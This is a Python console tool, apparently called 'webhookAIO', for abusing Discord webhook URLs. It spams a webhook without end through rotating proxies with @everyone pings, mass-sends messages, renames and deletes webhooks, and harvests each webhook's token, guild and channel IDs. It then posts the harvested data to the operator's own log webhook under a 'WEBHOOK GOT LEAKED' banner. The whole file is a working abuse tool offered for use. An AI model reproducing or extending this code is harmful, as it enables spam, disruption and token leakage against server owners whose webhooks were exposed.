import os
import requests
import base64
import time
import colorama
import pyperclip
import datetime
from colorama import Fore, Style
import json
import random
import subprocess

colorama.init(autoreset=False)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def redirect_to_main_menu():
    time.sleep(1)
    print(center_text("Exiting..."))
    time.sleep(1)
    print(center_text("Going back to main menu..."))
    time.sleep(1)
    clear_console()
    webhookAIO()

settings_file_path = "settings.json"

def load_settings(file_path):
    try:
        with open(file_path, 'r') as file:
            settings = json.load(file)
        return settings
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Error loading settings: {e}")
        return {}

def save_settings(settings, file_path):
    try:
        settings_str = {k: str(v).capitalize() if isinstance(v, bool) else v for k, v in settings.items()}
        with open(file_path, 'w') as file:
            json.dump(settings_str, file, indent=4)
        print("Settings saved successfully!")
        time.sleep(2)
        clear_console()
    except Exception as e:
        print(f"Error saving settings: {e}")

def check_setting(settings, key, expected_value):
    if key in settings and settings[key] == expected_value:
        return True
    return False

def change_console_size(cols, lines):
    mode_command = f"mode con: cols={cols} lines={lines}"
    subprocess.run(mode_command, shell=True)

def load_and_display():
    for i in range(101):
        clear_console()
        loading_bar = f"Loading: {i}% [{'=' * i}{' ' * (100 - i)}]"
        print(loading_bar)
        time.sleep(0.02)
    print(Fore.GREEN + "Loaded!" + Fore.WHITE)
    time.sleep(1)
    change_console_size(100, 25)

def check_if_loading_screen_was_cool():
    clear_console()
    loading_screen_coolish = input("Do you like the loading screen? (Y/N): ")
    if loading_screen_coolish.upper() == "Y":
        return True
    elif loading_screen_coolish.upper() == "N":
        return False
    else:
        print("Invalid input.")
        return False

def set_webhook(settings):
    webhook_del_log = input("Enter your webhook URL for deleting: ")
    settings["webhook_del_log"] = webhook_del_log
    with open(settings_file_path, 'w') as file:
        json.dump(settings, file)
    print("Webhook URL saved successfully!")
    time.sleep(2)
    clear_console()

def set_webhook1(settings):
    webhook_info_log = input("Enter your webhook URL for getting info: ")
    settings["webhook_info_log"] = webhook_info_log
    with open(settings_file_path, 'w') as file:
        json.dump(settings, file)
    print("Webhook URL saved successfully!")
    time.sleep(2)
    clear_console()

def center_text(text, width=100):
    centered = text.center(width)
    return centered

def center_text1(text, width=110):
    centered = text.center(width)
    return centered

class webhookAIO:
    def __init__(self):
        change_console_size(100, 25)
        os.system('cls' if os.name == 'nt' else 'clear')
        self.settings = load_settings(settings_file_path)
        if not self.settings.get("Loading_screen"):
            load_and_display()
            liked_loading_screen = check_if_loading_screen_was_cool()
            self.settings["Loading_screen"] = liked_loading_screen
            save_settings(self.settings, settings_file_path)
        if not self.settings.get("webhook_del_log"):
            print("Webhook URL for deleting logs not found in settings.")
            print("Please set your webhook URL.")
            set_webhook(self.settings)
            save_settings(self.settings, settings_file_path)
        if not self.settings.get("webhook_info_log"):
            print("Webhook URL for info logs not found in settings.")
            print("Please set your webhook URL.")
            set_webhook1(self.settings)
            save_settings(self.settings, settings_file_path)
        def display_menu():
            options = [
                center_text1(f"{Fore.BLUE}1.{Fore.RED} SPAM WEBHOOK"),
                center_text1(f"{Fore.BLUE}2.{Fore.RED} DELETE WEBHOOK"),
                center_text1(f"{Fore.BLUE}3.{Fore.RED} WEBHOOK INFO"),
                center_text1(f"{Fore.BLUE}4.{Fore.RED} CHANGE WEBHOOK NAME"),
                center_text1(f"{Fore.BLUE}5.{Fore.RED} SEND MESSAGES X TIMES"),
                center_text1(f"{Fore.BLUE}6.{Fore.RED} ENCODE/DECODE TO BASE64")
            ]

            menu_display = f'''{Fore.RED}
 ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄   ▄▀▀▄ ▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄   ▄▀▀▄ █      ▄▀▀█▄   ▄▀▀█▀▄   ▄▀▀▀▀▄  
█   █    ▐  █ ▐  ▄▀   ▐ ▐ ▄▀   █ █  █   ▄▀ █      █ █      █ █  █ ▄▀     ▐ ▄▀ ▀▄ █   █  █ █      █ 
▐  █        █   █▄▄▄▄▄    █▄▄▄▀  ▐  █▄▄▄█  █      █ █      █ ▐  █▀▄        █▄▄▄█ ▐   █  ▐ █      █ 
  █   ▄    █    █    ▌    █   █     █   █  ▀▄    ▄▀ ▀▄    ▄▀   █   █      ▄▀   █     █    ▀▄    ▄▀ 
   ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄    ▄▀▄▄▄▀    ▄▀  ▄▀    ▀▀▀▀     ▀▀▀▀   ▄▀   █      █   ▄▀   ▄▀▀▀▀▀▄   ▀▀▀▀   
         ▀     █    ▐   █    ▐    █   █                      █    ▐      ▐   ▐   █       █         
               ▐        ▐         ▐   ▐                      ▐                   ▐       ▐         

{options[0]}
{options[1]}
{options[2]}
{options[3]}
{options[4]}
{options[5]}
        '''
            print(menu_display)
        display_menu()
        selection = input(Fore.WHITE + center_text("Please select an option:") + "\n")
        if selection == "1":
            self.spam()
        elif selection == "2":
            self.delete(self.settings.get("webhook_del_log"))
        elif selection == "3":
            self.info(self.settings.get("webhook_info_log"))
        elif selection == "4":
            self.change_name()
        elif selection == "5":
            self.send_message()
        elif selection == "6":
            self.decode()
        else:
            print("Invalid option!")
            self.__init__()


    def spam(self):
        clear_console()
        def decode_base64(encoded_string):
            try:
                decoded_bytes = base64.b64decode(encoded_string)
                decoded_string = decoded_bytes.decode('utf-8')
                return decoded_string
            except Exception as e:
                return f"Error decoding Base64: {str(e)}"

        print(center_text("Choose an option:"))
        print(center_text("1 - Normal URL webhook"))
        print(center_text("2 - Base64 encoded webhook URL"))
        choice = input(center_text("Please select an option: ") + "\n")

        if choice == "1":
            webhook_spam = input(center_text("Enter the URL of the normal webhook: ") + "\n")
        elif choice == "2":
            base64_encoded_string = input(center_text("Enter the Base64 encoded webhook URL:") + "\n")
            webhook_spam = decode_base64(base64_encoded_string)
        else:
            print(center_text("Invalid choice. Exiting."))
            redirect_to_main_menu()
        print(center_text("Choose an option:"))
        print(center_text("1 - Given early message"))
        print(center_text("2 - Type your own message"))
        choice1 = input(center_text("Enter your choice: ") + "\n")
        if choice1 == "1":
            message = "@everyone KECZUU WAS HERE https://bigrat.monster/media/bigrat.jpg"
        if choice1 == "2":
            message = input(center_text("Please write your message below:") + "\n")
        usernames = ["Made with love by Keczuu. <3", "Oh my god Keczuu. please stop!", "DRAIN GANG FOR LIFE", "How was your day? Be honest", "Sub to my youtube! - @KeczuuToSucz", "Follow my insta! - @KeczuuToSucz"]
        avatar = "https://cdn.discordapp.com/avatars/454341370996326420/fe9cda3cf1f9238e3bec2019fa2a7a52.png?size=1024"
        tts = False

        with open("data/proxies.txt", "r") as proxy_select:
            proxies_list = proxy_select.readlines()
        proxies_list = [proxy.strip() for proxy in proxies_list if proxy.strip()]
        #code from spotify account generator by rado - thanks cutie <3
        
        while True:
            try:
                random_proxy = random.choice(proxies_list)
                proxy_dict = {"http": f"http://{random_proxy}", "https": f"http://{random_proxy}"}
                username = random.choice(usernames)
                response = requests.post(webhook_spam, json={"content": message, "username": username, "avatar_url": avatar, "tts": tts}, proxies=proxy_dict)
                if response.text == "":
                    print(f"{Fore.GREEN}[✔️] {Fore.YELLOW}Message sent successfully!")
                else:
                    print(f"{Fore.RED}[!] {Fore.YELLOW}You are being rate limited!")
            except Exception as e:
                print(f"Error: {str(e)}")
                redirect_to_main_menu()

    def delete(self, webhook_del_log):
        clear_console()
        choice = input(center_text("Choose an option:\n1 - Normal URL webhook\n2 - Base64-encoded webhook\nEnter 1 or 2: ") + "\n")

        if choice == '1':
            webhook_url = input(center_text("Enter the URL of webhook: ") + "\n")
        elif choice == '2':
            base64_webhook = input(center_text("Enter the base64-encoded webhook: ") + "\n")
            try:
                webhook_url = base64.b64decode(base64_webhook).decode('utf-8')
            except Exception as e:
                print(center_text("Error decoding base64 input."))
                redirect_to_main_menu()
        else:
            print(center_text("Invalid choice. Please choose 1 or 2."))
            redirect_to_main_menu()

        response = requests.get(webhook_url)
        if response.status_code != 200:
            print(center_text("Failed to retrieve webhook data. Check the URL or your internet connection."))
            redirect_to_main_menu()

        def Add_to_file():
            now = datetime.datetime.now()
            dt_string = now.strftime("%Y-%m-%d_%H-%M")
            with open(f'LOGS/Deleted_Webhook-{dt_string}.txt', 'w') as file:
                a = log
                file.write(a)
                file.close

        webhook_data = response.json()
        webhook_owner_id = webhook_data['user']['id']
        message = "@everyone webhook deleted https://bigrat.monster/media/bigrat.jpg"
        username = "Made with love by keczuu. <3"
        avatar = "https://cdn.discordapp.com/avatars/454341370996326420/fe9cda3cf1f9238e3bec2019fa2a7a52.png?size=1024"
        tts = True
        response = requests.post(webhook_url, json={"content": message, "username": username, "tts": tts, "avatar_url": avatar})
        print("Response:", response.text)
        requests.delete(webhook_url)
        message2 = f'<@{webhook_owner_id}> webhook has been deleted!'
        log = f"{webhook_owner_id} got his webhook deleted!\n{webhook_url}"
        requests.post(webhook_del_log, json={'content': message2})
        print(center_text("Webhook log has been sent!"))
        Add_to_file()
        print(center_text("Log saved!"))
        redirect_to_main_menu()

    def info(self, webhook_info_log):
        clear_console()
        webhook = input(center_text("Enter webhook URL: ") + "\n")
        try:
            response = requests.get(f"{webhook}")
            if response.status_code == 200:
                print(center_text("Webhook valid! Getting info..."))
                data = response.json()
                Name = str(data["name"])
                ChannelID = str(data["channel_id"])
                GuildID = str(data["guild_id"])
                Token = str(data["token"])
                Avatar = str(data["avatar"])
                ID= str(data['user']['id'])
                ID1= str(data['id'])

                def Add_to_file1():
                    with open('LOGS/Check_Webhook_log.txt', 'w') as file:
                        log1 = f"{message}"
                        file.write(log1)
                        file.close

                message1 = '```██╗    ██╗██╗   ██╗   ██╗███████╗██████╗ ██╗  ██╗ █████╗ \n██║    ██║╚██╗ ██╔╝   ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗\n██║ █╗ ██║ ╚████╔╝    ██║█████╗  ██████╔╝█████╔╝ ███████║\n██║███╗██║  ╚██╔╝██   ██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║\n╚███╔███╔╝   ██║ ╚█████╔╝███████╗██████╔╝██║  ██╗██║  ██║\n╚══╝╚══╝    ╚═╝  ╚════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝```'
                message2 = '```\n       ████████╗██╗   ██╗██████╗ ██╗   ██╗              \n       ╚══██╔══╝╚██╗ ██╔╝██╔══██╗██║   ██║              \n          ██║    ╚████╔╝ ██████╔╝██║   ██║              \n          ██║     ╚██╔╝  ██╔═══╝ ██║   ██║              \n          ██║      ██║   ██║     ╚██████╔╝              \n          ╚═╝      ╚═╝   ╚═╝      ╚═════╝               ```'
                message = f' ____    |\/|\n \  /\   / ..__.\n  \/  \__\   _/\n   \__   __  \_     \n      \____\___\'\n<@{ID}> WEBHOOK GOT LEAKED!!!\n\nWebhook name: {Name}\nChannel ID: {ChannelID}\nGuild ID: {GuildID}\nToken: {Token}\nAvatar: {Avatar}\n-=-=- Made with love by Keczuu <3 -=-=-'
                message3 = f'```██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗\n██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝\n██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ \n██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ \n╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗\n ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝```\n<@{ID}> WEBHOOK GOT LEAKED!!!\n\n`Webhook name: {Name}\nChannel ID: {ChannelID}\nGuild ID: {GuildID}\nToken: `||{Token}||`\nAvatar: {Avatar}\nURL: {webhook}`\n`-=-=- Made with love by Keczuu <3 -=-=-`'
                requests.post(webhook_info_log, json={'content': message1})
                requests.post(webhook_info_log, json={'content': message2})
                requests.post(webhook_info_log, json={'content': message3})

                print(center_text("Webhook data sent successfully!"))
                Add_to_file1()
                print(center_text("Saved to Check_Webhook_log.txt!"))
                redirect_to_main_menu()

            else:
                print(center_text("Webhook does not exists anymore!"))
                redirect_to_main_menu()

        except Exception as e:
            print(center_text(f"Error getting webhook info: {e}"))
            redirect_to_main_menu()

    def change_name(self):
        clear_console()
        webhook = input(center_text("Enter webhook URL:") + "\n")
        name = input(center_text("Webhook Name:") + "\n")
        try:
            requests.patch(webhook, json={"name":name})
            print(center_text("Username changed successfully!"))
            redirect_to_main_menu()
        except Exception as e:
            print(f"Error: {e}")

    def send_message(self):
        clear_console()
        webhook = input(center_text("Enter webhook URL:") + "\n")
        message = input(center_text("Enter your message:") + "\n")
        number_of_messages = int(input(center_text("How many times do you want to send it:") + "\n"))
        for i in range(number_of_messages):
            try:
                requests.post(webhook, json={'content': message})
            except Exception as e:
                print(f"{e}")
        print(f"Message sent {i+1} times!")
        time.sleep(3)
        redirect_to_main_menu()

    def decode(self):
        clear_console()
        def encode_to_base64(input_string):
            encoded_bytes = base64.b64encode(input_string.encode('utf-8'))
            encoded_string = encoded_bytes.decode('utf-8')
            return encoded_string

        def decode_from_base64(encoded_string):
            decoded_bytes = base64.b64decode(encoded_string.encode('utf-8'))
            decoded_string = decoded_bytes.decode('utf-8')
            return decoded_string

        while True:
            print(center_text("1. Encode to Base64"))
            print(center_text("2. Decode from Base64"))
            print("")

            choice = input(center_text("Enter your choice (1/2): ") + "\n")

            if choice == '1':
                input_string = input(center_text("Enter the string to encode to Base64: ") + "\n")
                encoded_result = encode_to_base64(input_string)
                print(center_text("Encoded to Base64:\n",center_text("",encoded_result)))
                print("")
                pyperclip.copy(encoded_result)
                print(center_text("Copied to clipboard!"))
                print("")
                redirect_to_main_menu()
            elif choice == '2':
                encoded_string = input(center_text("Enter the Base64-encoded string to decode: ") + "\n")
                decoded_result = decode_from_base64(encoded_string)
                print(center_text("Decoded from Base64:" + decoded_result))
                print("")
                pyperclip.copy(decoded_result)
                print(center_text("Copied to clipboard!"))
                print("")
                redirect_to_main_menu()
            else:
                print(center_text("Invalid choice. Going back to the menu."))
                redirect_to_main_menu()

if __name__ == "__main__":
    settings = load_settings(settings_file_path)
    if check_setting(settings, "Loading_screen", "True"):
        load_and_display()
    else:
        menu = webhookAIO()
        menu.start()
webhookAIO()